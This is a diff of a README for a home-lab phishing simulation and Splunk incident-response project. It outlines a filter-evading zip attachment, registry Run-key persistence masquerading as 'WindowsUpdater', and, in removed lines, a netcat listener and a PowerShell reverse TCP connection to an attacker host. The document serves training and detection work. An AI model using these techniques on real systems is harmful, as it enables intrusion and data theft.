@@ -1,183 +1,122 @@
 
-# Phishing- Simulation, Detection & Incident Response
+# Phishing Simulation, Detection and Incident Response
 
-A complete end-to-end simulation of a phishing attack followed by full incident response investigation. Built in a home lab environment using real industry tools - Splunk, Windows Event Logs, MXToolbox, and VirusTotal.
-
----
-
-## Project Overview
-
-This project simulates a realistic phishing attack across the full Cyber Kill Chain - from crafting and delivering a malicious email, to executing a payload, establishing persistence, beaconing back to an attacker machine (C2), and exfiltrating data. Every phase was then investigated and documented as a formal incident report.
-
----
-
-## Lab Environment
-
-| Machine | Role | OS |
-|---|---|---|
-| Ubuntu VM (VirtualBox) | Attacker | Ubuntu 24 |
-| Windows Laptop | Victim | Windows 11 Home |
-
-Both machines on the same bridged network - simulating an attacker and victim on the same LAN.
+![Status](https://img.shields.io/badge/Status-Completed-brightgreen)
+![Platform](https://img.shields.io/badge/Platform-Windows%2011-blue)
+![SIEM](https://img.shields.io/badge/SIEM-Splunk-orange)
+![Attacker OS](https://img.shields.io/badge/Attacker-Ubuntu%2024-red)
+![Event ID](https://img.shields.io/badge/Event%20ID-4688-purple)
+![Kill Chain](https://img.shields.io/badge/Framework-Cyber%20Kill%20Chain-darkblue)
+![License](https://img.shields.io/badge/License-Educational%20Use%20Only-lightgrey)
 
 ---
 
-## Tools Used
+## Overview
+
+This project is a full end-to-end simulation of a phishing attack, built in a home lab environment to practice real-world SOC analyst workflows. The project covers three distinct phases — building and delivering a realistic phishing attack, detecting it through behavioral log analysis, and documenting the findings as a formal SOC incident report.
+
+The attack was designed to simulate techniques used by real threat actors — including email filter bypass using password-protected archives, Living off the Land (LotL) reconnaissance using native Windows binaries, registry-based persistence via masquerading, and C2 communication using a reverse TCP connection. No specialized malware frameworks were used — the entire payload was built from scratch using a Windows batch script and PowerShell.
+
+Detection was performed entirely through behavioral analysis — hunting for suspicious parent-child process relationships in Splunk using Windows Event ID 4688. The payload had zero antivirus detections on VirusTotal, demonstrating that signature-based AV alone is insufficient against custom or novel threats.
+
+---
+
+## What This Project Covers
+
+| Area | Detail |
+|---|---|
+| Attack Simulation | Phishing email crafting, payload development, social engineering |
+| Email Security | DKIM, DMARC, SPF analysis — MXToolbox |
+| Endpoint Logging | Windows audit policy, Event ID 4688 process creation logging |
+| SIEM Analysis | Splunk SPL queries, process chain hunting, saved reports |
+| Threat Techniques | Recon, persistence, C2, exfiltration, masquerading, LotL |
+| Malware Analysis | SHA256 hashing, VirusTotal reputation check |
+| Incident Response | Full SOC-style incident report with IOCs, timeline, and recommendations |
+
+---
+
+## Tools and Technologies
 
 | Tool | Purpose |
 |---|---|
-| Splunk Enterprise | SIEM detection and process chain analysis |
+| Splunk Enterprise | SIEM — detection and process chain analysis |
 | Windows Event ID 4688 | Process creation logging |
 | MXToolbox | Email header and authentication analysis |
 | VirusTotal | Payload hash reputation check |
 | netcat | C2 listener on attacker machine |
+| Microsoft Outlook | Phishing email delivery |
+| PowerShell | Payload C2 beacon |
 | auditpol | Windows audit policy configuration |
-| PowerShell | Payload delivery and C2 beacon |
+| Ubuntu 24 (VirtualBox) | Attacker machine |
+| Windows 11 | Victim machine |
 
 ---
 
-## Simulation Phases (Cyber Kill Chain)
-
-### 1. Delivery
-Crafted a phishing email impersonating an IT security notice. Payload was disguised as `invoice_report.txt` inside a password-protected zip to bypass email content filters. Password was included in the email body - a classic social engineering technique.
-
-![Email Received](screenshots/emailreceived.png)
-
-**Email Authentication Failures (MXToolbox):**
-- DKIM: ❌ Not signed
-- DMARC: ❌ Failed
-- SPF: ❌ Not authenticated
-- Originating server flagged on blacklist
-
-![Delivery and Relay Info](screenshots/deliveryandrelayinfo.png)
-![SPF and DKIM Info](screenshots/spf%20and%20dkim%20info%201.png)
+## Lab Setup
+┌─────────────────────┐         Bridged Network        ┌─────────────────────┐
+│   Ubuntu VM         │◄──────────────────────────────►│   Windows Laptop    │
+│   (Attacker)        │                                 │   (Victim)          │
+│   192.168.0.24      │                                 │   192.168.0.14      │
+│                     │                                 │                     │
+│   - swaks           │                                 │   - Splunk          │
+│   - netcat          │                                 │   - Event Viewer    │
+│   - payload craft   │                                 │   - Outlook         │
+└─────────────────────┘                                 └─────────────────────┘
 
 ---
 
-### 2. Execution
-Victim extracted the zip, renamed the file to `.bat`, and executed it. Windows logged `explorer.exe` spawning `cmd.exe` - the key red flag indicating a user ran a malicious script.
+## Attack Flow (Cyber Kill Chain)
 
-![Payload](screenshots/payload.png)
+Delivery       →  Phishing email with password-protected zip attachment
+Execution      →  Victim runs invoice_report.bat → cmd.exe spawned
+Recon          →  whoami, systeminfo, ipconfig, net user, net localgroup
+Persistence    →  Registry Run key added (WindowsUpdater) — masquerading
+C2             →  PowerShell reverse TCP connection to 192.168.0.24:4444
+Exfiltration   →  System data transmitted to attacker over C2 channel
 
----
-
-### 3. Reconnaissance
-The payload immediately ran system recon commands - `whoami`, `systeminfo`, `ipconfig`, `net user`, `net localgroup administrators` - to profile the victim machine. All captured as Event ID 4688 entries in Splunk.
-
----
-
-### 4. Persistence
-A registry Run key named `WindowsUpdater` was added to survive reboots. The name was chosen to blend in with legitimate startup programs - a masquerading technique.
-
-```
-HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-WindowsUpdater = C:\Users\theep\invoice_report.bat
-```
-
-![Persistence Registry Key](screenshots/persistance.png)
-![Persistence Detected in Splunk](screenshots/persistance%20report.png)
-
----
-
-### 5. Command & Control (C2)
-PowerShell established a TCP connection back to the attacker machine on port 4444. The attacker received the connection via netcat - simulating a reverse shell C2 beacon.
-
-```
-Attacker:  nc -lvp 4444
-Victim:    PowerShell New-Object Net.Sockets.TCPClient('192.168.0.24', 4444)
-```
-
-![C2 Connection and Exfiltration](screenshots/Screenshot%202026-04-20%20185640.png)
-
----
-
-### 6. Exfiltration
-All reconnaissance data was sent over the C2 connection to the attacker - including OS details, network config, installed patches, and a full list of admin accounts.
-
----
-
-## Detection - Splunk
-
-The entire attack chain was detected using a single Splunk SPL query hunting for suspicious parent-child process relationships:
-
-```spl
-index=* EventCode=4688
-| where New_Process_Name="C:\\Windows\\System32\\cmd.exe"
-OR New_Process_Name="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
-OR Creator_Process_Name="C:\\Windows\\System32\\cmd.exe"
-OR Creator_Process_Name="C:\\Windows\\explorer.exe"
-| table _time, user, New_Process_Name, Creator_Process_Name
-| sort _time
-```
-
-![Splunk Detection Report](screenshots/detection%20report.png)
-
-**Complete attack chain visible in Splunk:**
-
-| Time | Process | Parent | Phase |
-|---|---|---|---|
-| 18:40:04 | cmd.exe | explorer.exe | Execution |
-| 18:40:04 | whoami.exe | cmd.exe | Recon |
-| 18:40:04 | systeminfo.exe | cmd.exe | Recon |
-| 18:40:08 | ipconfig.exe | cmd.exe | Recon |
-| 18:40:08 | net.exe | cmd.exe | Recon |
-| 18:40:08 | reg.exe | cmd.exe | Persistence |
-| 18:40:08 | powershell.exe | cmd.exe | C2 + Exfil |
-
----
-
-## IOCs (Indicators of Compromise)
-
-| Type | Value |
-|---|---|
-| Sender Email | amahalaxmiarulljothi@hawk.illinoistech.edu |
-| Malicious File | invoice_report.bat |
-| File Hash (SHA256) | d8d89dba02219e4d3014a0fa4bdf9e671e2891b95cbf0d4381d595f9c02d06d8 |
-| Attacker IP | 192.168.0.24 |
-| C2 Port | 4444 (TCP) |
-| Registry Key | HKCU\...\Run\WindowsUpdater |
-
-![SHA256 Hash](screenshots/sha.png)
-![VirusTotal Result](screenshots/virustotal.png)
-
-**VirusTotal result: Hash not found** - the custom payload would bypass all signature-based antivirus engines. Only behavioral detection via Splunk caught it.
 
 ---
 
 ## Key Findings
 
-- Password-protected zips successfully bypass email content filters
-- A custom payload with no prior signatures is invisible to traditional AV
-- Behavioral analysis (Event 4688 + Splunk) detected the full attack chain
-- The attacker used masquerading (naming the registry key "WindowsUpdater") to blend in with legitimate startup entries
+- A custom payload with zero antivirus signatures successfully bypassed all email filters and endpoint protection
+- Password-protected zip attachments bypass email content scanners — a widely used real-world technique
 - The entire kill chain from execution to exfiltration completed in under 5 seconds
+- Behavioral detection via Splunk (Event ID 4688) was the only effective control — traditional AV failed completely
+- The attacker used native Windows tools exclusively (LotL) — no foreign binaries were introduced to the system
+- Registry masquerading (`WindowsUpdater`) made persistence difficult to spot without cross-referencing known legitimate startup entries
 
 ---
 
-## Repository Structure
+## Project Structure
 
-```
-phishing-incident-response/
+phishing-simulation-detection-ir/
 │
 ├── README.md
-├── report/
-│   └── Incident_Report_IR-2026-001.md
-├── screenshots/
-│   └── (all evidence screenshots)
+│
+├── docs/
+│   ├── 01-simulation.md          ← How the attack was built and delivered
+│   ├── 02-detection.md           ← How the attack was detected and investigated
+│   └── 03-incident-report.md     ← Full SOC-style incident report
+│
+├── screenshots/                  ← All evidence screenshots referenced in docs
+│
 ├── payloads/
-│   └── invoice_report.bat
+│   └── invoice_report.bat        ← Simulated malicious payload
+│
 └── splunk-queries/
-    └── queries.md
-```
+└── queries.md                ← All SPL queries used during investigation
 
 ---
 
-## Full Incident Report
+## Documentation
 
-The complete incident report including timeline, root cause analysis, containment steps, and recommendations is available here:
-
-📄 [Incident Report IR-2026-001](report/Incident_Report_IR-2026-001.md)
+| Document | Description |
+|---|---|
+| [Simulation](docs/01-simulation.md) | Step by step walkthrough of how the attack was built and delivered |
+| [Detection](docs/02-detection.md) | How the attack was hunted and identified using Splunk and Event ID 4688 |
+| [Incident Report](docs/03-incident-report.md) | Full SOC-style incident report with timeline, IOCs, and recommendations |
 
 ---
 
-*All activities were conducted in a controlled lab environment for educational purposes only.*
+> All activities were conducted in a controlled home lab environment for educational purposes only. No real systems or individuals were targeted.
